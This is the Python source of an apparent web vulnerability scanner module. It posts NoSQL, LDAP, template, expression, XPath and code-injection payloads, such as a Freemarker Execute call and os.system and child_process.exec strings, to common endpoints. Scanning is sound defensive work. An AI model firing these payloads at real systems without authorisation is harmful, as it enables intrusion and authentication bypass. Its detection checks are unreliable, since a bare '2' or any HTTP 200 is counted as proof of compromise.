"""
Advanced Injection Scanners - NoSQL, LDAP, SSTI, OS Command injection
"""
import re
import time
from typing import List, Dict
from urllib.parse import urljoin
import requests
from models.schemas import VulnerabilitySchema, SeverityEnum


class AdvancedInjectionScanner:
    """Advanced injection vulnerability testing beyond SQL"""

    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.session = requests.Session()

    def scan(self, url: str, depth: int = 2) -> List[VulnerabilitySchema]:
        """Run all advanced injection checks"""
        vulnerabilities = []

        vulnerabilities.extend(self._test_nosql_injection(url))
        vulnerabilities.extend(self._test_ldap_injection(url))
        vulnerabilities.extend(self._test_ssti(url))
        vulnerabilities.extend(self._test_expression_injection(url))
        vulnerabilities.extend(self._test_xpath_injection(url))
        vulnerabilities.extend(self._test_code_injection(url))

        return vulnerabilities

    def _test_nosql_injection(self, url: str) -> List[VulnerabilitySchema]:
        """Test for NoSQL injection vulnerabilities"""
        vulnerabilities = []

        # NoSQL injection payloads
        nosql_payloads = [
            # MongoDB
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": "admin", "password": {"$gt": ""}},

            # String-based MongoDB injection
            "'; return true; var dummy='",
            "' || '1'=='1",
            "'; return '1'=='1",

            # JavaScript execution
            {"username": {"$where": "this.username == 'admin'"}, "password": "x"},

            # Redis
            "admin\n\nget *",
            "admin\n\nkeys *",
        ]

        test_endpoints = ['/api/login', '/api/users', '/api/search', '/login']

        for endpoint in test_endpoints:
            test_url = urljoin(url, endpoint)

            for payload in nosql_payloads:
                try:
                    # Test JSON payload
                    if isinstance(payload, dict):
                        resp = self.session.post(
                            test_url,
                            json=payload,
                            timeout=self.timeout,
                            verify=False
                        )
                    else:
                        # Test string payload
                        resp = self.session.post(
                            test_url,
                            json={"username": payload, "password": payload},
                            timeout=self.timeout,
                            verify=False
                        )

                    # Check for successful injection
                    if resp.status_code in [200, 302]:
                        if self._check_nosql_success(resp.text):
                            vulnerabilities.append(VulnerabilitySchema(
                                type="nosql_injection",
                                severity=SeverityEnum.CRITICAL,
                                url=test_url,
                                description="NoSQL injection vulnerability detected",
                                evidence=f"Payload succeeded: {str(payload)[:100]}",
                                remediation="Use parameterized queries, validate input, disable JavaScript execution in MongoDB",
                                cwe="CWE-943",
                                cvss_score=9.8
                            ))
                            break

                    # Check for MongoDB errors
                    if any(err in resp.text.lower() for err in ['mongodb', 'mongo', 'bson', 'objectid']):
                        vulnerabilities.append(VulnerabilitySchema(
                            type="nosql_error_disclosure",
                            severity=SeverityEnum.MEDIUM,
                            url=test_url,
                            description="MongoDB error messages disclosed",
                            evidence="Response contains MongoDB-specific error information",
                            remediation="Implement generic error handling, hide database details",
                            cwe="CWE-209",
                            cvss_score=5.3
                        ))

                except Exception:
                    continue

        return vulnerabilities

    def _test_ldap_injection(self, url: str) -> List[VulnerabilitySchema]:
        """Test for LDAP injection vulnerabilities"""
        vulnerabilities = []

        # LDAP injection payloads
        ldap_payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
            ")(cn=*))(|(cn=*",
            "*))(|(password=*",
        ]

        test_endpoints = ['/login', '/search', '/api/users', '/api/auth']

        for endpoint in test_endpoints:
            test_url = urljoin(url, endpoint)

            for payload in ldap_payloads:
                try:
                    resp = self.session.post(
                        test_url,
                        json={"username": payload, "password": "test"},
                        timeout=self.timeout,
                        verify=False
                    )

                    # Check for LDAP errors
                    ldap_errors = [
                        'ldap', 'invalid dn syntax', 'bad search filter',
                        'naming exception', 'javax.naming', 'ldap error'
                    ]

                    if any(err in resp.text.lower() for err in ldap_errors):
                        vulnerabilities.append(VulnerabilitySchema(
                            type="ldap_injection",
                            severity=SeverityEnum.HIGH,
                            url=test_url,
                            description="LDAP injection vulnerability detected",
                            evidence=f"LDAP error triggered by payload: {payload}",
                            remediation="Escape LDAP special characters, use parameterized queries",
                            cwe="CWE-90",
                            cvss_score=8.1
                        ))
                        break

                    # Check for bypass (status 200 with injection)
                    if resp.status_code == 200 and payload in ['*', '*)(&']:
                        vulnerabilities.append(VulnerabilitySchema(
                            type="ldap_authentication_bypass",
                            severity=SeverityEnum.CRITICAL,
                            url=test_url,
                            description="LDAP authentication bypass detected",
                            evidence=f"Authentication bypassed with payload: {payload}",
                            remediation="Properly validate and escape LDAP filter inputs",
                            cwe="CWE-90",
                            cvss_score=9.8
                        ))
                        break

                except Exception:
                    continue

        return vulnerabilities

    def _test_ssti(self, url: str) -> List[VulnerabilitySchema]:
        """Test for Server-Side Template Injection (SSTI)"""
        vulnerabilities = []

        # SSTI payloads for different engines
        ssti_payloads = [
            # Jinja2 (Python)
            "{{7*7}}",
            "{{config}}",
            "{{self}}",
            "${7*7}",

            # Twig (PHP)
            "{{7*'7'}}",
            "{{_self.env.display('test')}}",

            # Freemarker (Java)
            "${7*7}",
            "#{7*7}",
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",

            # Velocity (Java)
            "#set($x=7*7)$x",

            # Smarty (PHP)
            "{7*7}",
            "{$smarty.version}",

            # EL (Java)
            "${7*7}",
            "#{7*7}",
        ]

        test_endpoints = ['/search', '/api/render', '/template', '/preview', '/api/email']

        for endpoint in test_endpoints:
            test_url = urljoin(url, endpoint)

            for payload in ssti_payloads:
                try:
                    # Test in different parameters
                    test_params = [
                        {'q': payload},
                        {'search': payload},
                        {'template': payload},
                        {'name': payload},
                        {'message': payload},
                    ]

                    for params in test_params:
                        resp = self.session.post(
                            test_url,
                            json=params,
                            timeout=self.timeout,
                            verify=False
                        )

                        # Check if template was evaluated
                        if '49' in resp.text:  # 7*7 = 49
                            vulnerabilities.append(VulnerabilitySchema(
                                type="ssti_vulnerability",
                                severity=SeverityEnum.CRITICAL,
                                url=test_url,
                                description="Server-Side Template Injection detected",
                                evidence=f"Template expression evaluated: {payload}",
                                remediation="Use sandboxed template engines, avoid user input in templates",
                                cwe="CWE-94",
                                cvss_score=9.8
                            ))
                            return vulnerabilities

                        # Check for template engine errors
                        template_errors = [
                            'jinja2', 'twig', 'freemarker', 'velocity',
                            'template error', 'templatesyntaxerror',
                            'undefinedvariableerror'
                        ]

                        if any(err in resp.text.lower() for err in template_errors):
                            vulnerabilities.append(VulnerabilitySchema(
                                type="ssti_potential",
                                severity=SeverityEnum.HIGH,
                                url=test_url,
                                description="Potential SSTI - template engine error exposed",
                                evidence=f"Template error triggered by: {payload}",
                                remediation="Sanitize user input, use template sandboxing",
                                cwe="CWE-94",
                                cvss_score=8.1
                            ))

                except Exception:
                    continue

        return vulnerabilities

    def _test_expression_injection(self, url: str) -> List[VulnerabilitySchema]:
        """Test for Expression Language injection"""
        vulnerabilities = []

        # EL injection payloads
        el_payloads = [
            "${1+1}",
            "#{1+1}",
            "${applicationScope}",
            "#{facesContext}",
            "${pageContext}",
            "${sessionScope}",
        ]

        test_endpoints = ['/api/search', '/api/eval', '/calculate']

        for endpoint in test_endpoints:
            test_url = urljoin(url, endpoint)

            for payload in el_payloads:
                try:
                    resp = self.session.post(
                        test_url,
                        json={'expression': payload, 'input': payload},
                        timeout=self.timeout,
                        verify=False
                    )

                    if '2' in resp.text and (payload == "${1+1}" or payload == "#{1+1}"):
                        vulnerabilities.append(VulnerabilitySchema(
                            type="expression_injection",
                            severity=SeverityEnum.HIGH,
                            url=test_url,
                            description="Expression Language injection detected",
                            evidence=f"Expression evaluated: {payload}",
                            remediation="Disable EL evaluation on user input, use parameterized queries",
                            cwe="CWE-917",
                            cvss_score=8.1
                        ))
                        break

                except Exception:
                    continue

        return vulnerabilities

    def _test_xpath_injection(self, url: str) -> List[VulnerabilitySchema]:
        """Test for XPath injection vulnerabilities"""
        vulnerabilities = []

        # XPath injection payloads
        xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or '1'='1",
            "x' or name()='username' or 'x'='y",
            "test' or count(/*)>0 or '1'='1",
            "' or substring(//user[1]/password,1,1)='a",
        ]

        test_endpoints = ['/search', '/api/search', '/api/users', '/login']

        for endpoint in test_endpoints:
            test_url = urljoin(url, endpoint)

            for payload in xpath_payloads:
                try:
                    resp = self.session.post(
                        test_url,
                        json={'username': payload, 'query': payload},
                        timeout=self.timeout,
                        verify=False
                    )

                    # Check for XPath errors
                    xpath_errors = [
                        'xpath', 'xml', 'xmlexception',
                        'xpathexception', 'xpath syntax error'
                    ]

                    if any(err in resp.text.lower() for err in xpath_errors):
                        vulnerabilities.append(VulnerabilitySchema(
                            type="xpath_injection",
                            severity=SeverityEnum.HIGH,
                            url=test_url,
                            description="XPath injection vulnerability detected",
                            evidence=f"XPath error triggered by: {payload}",
                            remediation="Use parameterized XPath queries, validate input",
                            cwe="CWE-643",
                            cvss_score=8.1
                        ))
                        break

                    # Check for authentication bypass
                    if resp.status_code == 200 and "' or '1'='1" in payload:
                        vulnerabilities.append(VulnerabilitySchema(
                            type="xpath_auth_bypass",
                            severity=SeverityEnum.CRITICAL,
                            url=test_url,
                            description="XPath authentication bypass detected",
                            evidence=f"Bypass achieved with: {payload}",
                            remediation="Use parameterized queries, proper input validation",
                            cwe="CWE-643",
                            cvss_score=9.8
                        ))
                        break

                except Exception:
                    continue

        return vulnerabilities

    def _test_code_injection(self, url: str) -> List[VulnerabilitySchema]:
        """Test for code injection vulnerabilities"""
        vulnerabilities = []

        # Code injection payloads
        code_payloads = [
            # Python
            "__import__('os').system('echo vulnerable')",
            "exec('print(1+1)')",
            "eval('1+1')",

            # PHP
            "system('echo vulnerable');",
            "phpinfo();",
            "eval('echo 1+1;');",

            # JavaScript (Node.js)
            "require('child_process').exec('echo vulnerable')",
            "eval('1+1')",
        ]

        test_endpoints = ['/api/eval', '/api/execute', '/api/run', '/calculate']

        for endpoint in test_endpoints:
            test_url = urljoin(url, endpoint)

            for payload in code_payloads:
                try:
                    resp = self.session.post(
                        test_url,
                        json={'code': payload, 'expression': payload},
                        timeout=self.timeout,
                        verify=False
                    )

                    # Check for code execution
                    if 'vulnerable' in resp.text or '2' in resp.text:
                        vulnerabilities.append(VulnerabilitySchema(
                            type="code_injection",
                            severity=SeverityEnum.CRITICAL,
                            url=test_url,
                            description="Code injection vulnerability - arbitrary code execution",
                            evidence=f"Code executed: {payload[:50]}",
                            remediation="Never execute user-provided code, use safe alternatives",
                            cwe="CWE-94",
                            cvss_score=10.0
                        ))
                        break

                except Exception:
                    continue

        return vulnerabilities

    def _check_nosql_success(self, response_text: str) -> bool:
        """Check if NoSQL injection was successful"""
        success_indicators = [
            'welcome', 'dashboard', 'logged in', 'success',
            'token', 'session', 'admin', 'profile'
        ]
        return any(indicator in response_text.lower() for indicator in success_indicators)
